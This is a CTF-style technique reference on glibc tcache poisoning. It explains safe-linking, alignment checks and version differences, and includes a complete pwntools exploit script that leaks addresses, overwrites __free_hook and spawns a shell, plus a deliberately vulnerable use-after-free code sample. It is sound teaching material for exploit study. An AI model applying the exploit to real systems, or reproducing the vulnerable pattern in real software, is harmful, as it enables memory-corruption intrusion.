---
title: "Tcache Poisoning - Arbitrary Allocation From One Pointer Write"
category: pwn
subcategory: heap
type: technique
tags: [tcache, tcache-poisoning, arbitrary-write, uaf, heap, safe-linking, free-hook, malloc-hook, double-free, alignment-check, pwndbg, gef, pwntools, one-gadget, glibc]
difficulty: easy
summary: "Overwrite the next pointer of a chunk sitting in tcache; the following malloc of that size returns any address you like."
when_to_use:
  - "You can write into a freed chunk (UAF, overflow into a freed neighbour, or double free)"
  - "The allocation size is between 0x20 and 0x410 so it uses tcache"
  - "You already have a libc leak and need an arbitrary write"
  - "You need a controlled allocation on the stack, in .bss, or over a hook"
tools: [pwntools, pwndbg, gef, one-gadget]
related: [heap-use-after-free, heap-double-free, heap-safe-linking-bypass, heap-write-targets, heap-fake-chunk]
---

## TL;DR

The tcache is a singly-linked list whose `next` pointer lives in the freed chunk's user
data. One 8-byte write into a freed chunk redirects the list. The next malloc of that
size returns the real chunk, the one after returns your address. Two mallocs and you
have an arbitrary write. This is the default heap exploit on glibc 2.26-2.39.

## Recognise it

- Any of: UAF edit, heap overflow reaching a freed chunk, double free, off-by-one.
- The challenge's allocation sizes are all <= 0x408 (chunk <= 0x410) - tcache territory.
- `checksec` shows Full RELRO, so GOT is out and hooks/exit handlers are the target.
- The libc is 2.26 or newer (tcache exists at all).

## Vulnerable code shape

```c
static char *ptr[16];
static size_t sz[16];

void do_edit(void) {
    int i = read_idx();
    if (i < 0 || i >= 16 || !ptr[i]) return;
    read(0, ptr[i], sz[i]);     /* no in-use check: writes into a freed chunk */
}

void do_free(void) {
    int i = read_idx();
    free(ptr[i]);               /* ptr[i] survives -> the edit above reaches tcache next */
}
```

## Theory

Targets: glibc 2.26 - 2.39. The technique never dies; only the encoding of `next` and
the number of sanity checks change.

```c
typedef struct tcache_entry {
  struct tcache_entry *next;
  struct tcache_entry *key;   /* added 2.29 */
} tcache_entry;

static __always_inline void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = REVEAL_PTR (e->next);   /* REVEAL_PTR is identity < 2.32 */
  --(tcache->counts[tc_idx]);
  e->key = NULL;
  return (void *) e;
}
```

The head is taken, and `entries[idx]` becomes whatever the head's `next` said. There is
no check that `next` points into the heap, no check that it is a valid chunk, and
(before 2.34) no alignment check.

### Version-by-version constraints

| glibc | `next` encoding | extra checks you must satisfy |
|-------|-----------------|-------------------------------|
| 2.26 - 2.28 | raw pointer | none |
| 2.29 - 2.31 | raw pointer | `key` double-free scan on free only |
| 2.32 - 2.33 | `PROTECT_PTR(&e->next, ptr) = (pos >> 12) ^ ptr` | need a heap leak to mangle |
| 2.34 - 2.39 | same, `tcache_key` is random | returned pointer must be 16-byte aligned: `malloc(): unaligned tcache chunk detected`; `counts[tc_idx] > 0` |

The 2.34 alignment check is:

```c
if (__glibc_unlikely (!aligned_OK (e)))
  malloc_printerr ("malloc(): unaligned tcache chunk detected");
```

`aligned_OK(p)` is `((uintptr_t)p & 0xf) == 0`. That is what killed the classic
`__malloc_hook - 0x23` fake-chunk trick on tcache. Your target must be 16-byte aligned
from 2.34 onward. `__free_hook`, `_IO_2_1_stdout_`, and most libc globals are.

### The mangle

From 2.32:

```
PROTECT_PTR(pos, ptr)  =  ((uintptr_t)pos >> 12) ^ (uintptr_t)ptr
REVEAL_PTR(ptr)        =  PROTECT_PTR(&ptr, ptr)
```

`pos` is the *address of the `next` field*, i.e. `chunk_user_address`. So to make the
allocator hand out `target`, write `((chunk_addr) >> 12) ^ target` into the chunk.
`chunk_addr >> 12` is just the heap page number, which one heap leak gives you.

## Attack

glibc 2.31, UAF edit available, `__free_hook` target:

1. `alloc(0, 0x88)` -> A
2. `alloc(1, 0x88)` -> B (so the bin has two entries and `show` gives a heap leak)
3. `free(0)` - tcache[0x90]: A
4. `free(1)` - tcache[0x90]: B -> A
5. `show(1)` - read B's `next` = A. Heap leak (on 2.32+ this is `(heap>>12) ^ A`).
6. `edit(1, p64(__free_hook))` - tcache[0x90]: B -> `__free_hook`
   (2.32+: `p64(mangle(B_user_addr, __free_hook))`)
7. `alloc(2, 0x88)` - returns B. `entries[7] = __free_hook`, `counts[7] = 1`.
8. `alloc(3, 0x88, p64(system))` - returns `__free_hook`, and the write lands there.
9. `alloc(4, 0x18, b"/bin/sh\x00")`
10. `free(4)` - `__free_hook("/bin/sh")` = `system("/bin/sh")`.

## Heap state

```text
after step 4                       tcache->entries[7] -> B

    B (user 0x...750)                A (user 0x...6c0)
    +0x00 | next -> A  |             +0x00 | next = 0 |
    +0x08 | key        |             +0x08 | key      |
    counts[7] = 2

after step 6 (poisoned)

    B                                __free_hook (libc)
    +0x00 | next -> __free_hook |    +0x00 | 0 |
    counts[7] = 2

step 7: malloc -> B          entries[7] = __free_hook, counts[7] = 1
step 8: malloc -> __free_hook
        entries[7] = *(void**)__free_hook = 0, counts[7] = 0
        our write lands directly on __free_hook


safe-linking (2.32+) view of the same poison:

    B at heap+0x750
    +0x00 | next = (0x00005600aaaaa750 >> 12) ^ __free_hook |
                   ^--- the "position", i.e. &B->next
    reveal: entries[7] = ((&B->next) >> 12) ^ stored  ==  __free_hook   OK
```

## Exploit

```python
#!/usr/bin/env python3
"""Tcache poisoning, version-aware.

  GLIBC=2.31  -> raw next pointer, target __free_hook
  GLIBC=2.35  -> safe-linking mangle, hooks gone, target _IO_2_1_stdout_ vtable-free
                 FSOP is out of scope here, so we demo an arbitrary write instead.

Usage:
    ./exploit.py GLIBC=2.31
    ./exploit.py GLIBC=2.35 REMOTE HOST=1.2.3.4 PORT=1337
"""
from pwn import ELF, args, context, log, p64, process, remote, u64

BINARY = args.BIN or "./chal"
LIBC = args.LIBC or "./libc.so.6"
GLIBC = float(args.GLIBC or "2.31")

context.binary = elf = ELF(BINARY, checksec=False)
context.log_level = args.LOG or "info"
libc = ELF(LIBC, checksec=False)

SIZE = 0x88               # -> 0x90 chunk, tcache index 7


def mangle(pos, ptr):
    """PROTECT_PTR: pos is the address of the next field (= chunk user address)."""
    return (pos >> 12) ^ ptr


def demangle(val):
    """Iteratively reveal a safe-linked pointer with no prior heap knowledge."""
    mask = 0xFFF << 52
    out = 0
    for i in range(5):
        v = ((out ^ val) & mask) >> 12
        out |= v
        mask >>= 12
    return out ^ val


def start():
    if args.REMOTE:
        return remote(args.HOST or "127.0.0.1", int(args.PORT or 1337))
    return process([BINARY])


io = start()


def menu(c):
    io.sendlineafter(b"> ", str(c).encode())


def alloc(idx, size, data=b"A"):
    menu(1)
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"size: ", str(size).encode())
    io.sendafter(b"content: ", data)


def free(idx):
    menu(2)
    io.sendlineafter(b"index: ", str(idx).encode())


def show(idx):
    menu(3)
    io.sendlineafter(b"index: ", str(idx).encode())
    io.recvuntil(b"content: ")
    return io.recvline().rstrip(b"\n")


def edit(idx, data):
    menu(4)
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendafter(b"content: ", data)


def leak_u64(raw):
    return u64(raw.ljust(8, b"\x00")[:8])


# ---------------------------------------------------------------- 1. libc leak
alloc(10, 0x418, b"leaker")
alloc(11, 0x18, b"guard")
free(10)
libc.address = leak_u64(show(10)) - 0x60 - libc.sym["main_arena"]
log.success("libc base = %#x", libc.address)

# ---------------------------------------------------------------- 2. heap leak
alloc(0, SIZE, b"A" * 8)
alloc(1, SIZE, b"B" * 8)
free(0)
free(1)                                     # tcache[7]: B -> A

raw = leak_u64(show(1))
if GLIBC >= 2.32:
    a_user = demangle(raw)
    b_user = a_user + 0x90                  # B sits one 0x90 chunk above A
    log.success("chunk A user = %#x (demangled)", a_user)
else:
    a_user = raw
    b_user = a_user + 0x90
    log.success("chunk A user = %#x", a_user)

heap_page = b_user & ~0xFFF
log.info("heap page = %#x", heap_page)

# ---------------------------------------------------------------- 3. poison
if GLIBC < 2.34:
    target = libc.sym["__free_hook"]
    payload_value = p64(system_target := libc.sym["system"])
else:
    # 2.34+: hooks are gone. Demo target: a 16-byte aligned libc global we can
    # verify in the debugger. Replace with your FSOP / exit-handler target.
    target = libc.sym["_IO_2_1_stdout_"]
    payload_value = p64(0xDEADBEEFCAFEBABE)

assert target % 0x10 == 0, "2.34+ requires a 16-byte aligned target"

if GLIBC >= 2.32:
    poison = p64(mangle(b_user, target))
else:
    poison = p64(target)

edit(1, poison)
log.info("tcache[7] head now -> %#x", target)

alloc(2, SIZE, b"consume B")                # returns B
alloc(3, SIZE, payload_value)               # returns `target`
log.success("arbitrary write done at %#x", target)

# ---------------------------------------------------------------- 4. trigger
if GLIBC < 2.34:
    alloc(4, 0x18, b"/bin/sh\x00")
    free(4)                                 # system("/bin/sh")

io.interactive()
```

## Variants & pitfalls

- **Poison `tcache_perthread_struct` itself.** It is a normal 0x290 chunk at the heap
  base. Point a tcache `next` at `heap_base + 0x10` and the next malloc returns the
  struct: now you can write `entries[]` directly for *any* size, with no further
  mangling, and set `counts[]` to whatever you need.
- **`counts` must be > 0 on 2.34+.** If you set `entries[i]` by hand, set `counts[i]`
  too, or `tcache_get` is never reached.
- **Off-by-one alignment.** Wanting `__free_hook - 0x8`? Not allowed on 2.34+. Use a
  chunk-size trick or target something already aligned.
- **`calloc` bypasses tcache.** Challenges add a `calloc` allocation specifically to
  break this. Use the fastbin equivalent or poison `tcache_perthread_struct`.
- **The heap leak is mandatory on 2.32+.** If `show()` only prints until a NUL and the
  mangled pointer has a zero byte, allocate, write filler, free, then re-read: or use
  the `demangle()` helper above on a partial leak of the first chunk in the bin
  (whose `next` is 0, so the stored value is exactly `pos >> 12`).
- **Thread arenas**: the tcache is per thread. If the menu runs allocations on a worker
  thread, your poison has to happen on that same thread.

## Debugging

```text
pwndbg> tcache                        # entries[] and counts[] - the ground truth
pwndbg> bins
pwndbg> vis_heap_chunks 10
pwndbg> x/2gx <freed_chunk_user>      # next, key
pwndbg> p/x ((unsigned long)$heap_base >> 12)   # the safe-linking mask
pwndbg> b *__libc_malloc
pwndbg> watch *(long*)&__free_hook
gef>  heap bins tcache
```

```bash
# Verify alignment of your chosen target before you burn an attempt on it.
# (2.34+ aborts with "unaligned tcache chunk detected" otherwise.)
nm -D ./libc.so.6 | grep -E '__free_hook|_IO_2_1_stdout_'
```

## Tools

- `pwndbg` `tcache` command, `gef heap bins tcache`.
- `one_gadget ./libc.so.6` for the hook payload.
- `pwntools` `libc.sym[...]` so you never hardcode an offset.

## References

- shellphish `how2heap`: `tcache_poisoning.c`, `safe_link.c`.
- glibc `malloc/malloc.c`: `tcache_get`, `tcache_put`, `PROTECT_PTR`.
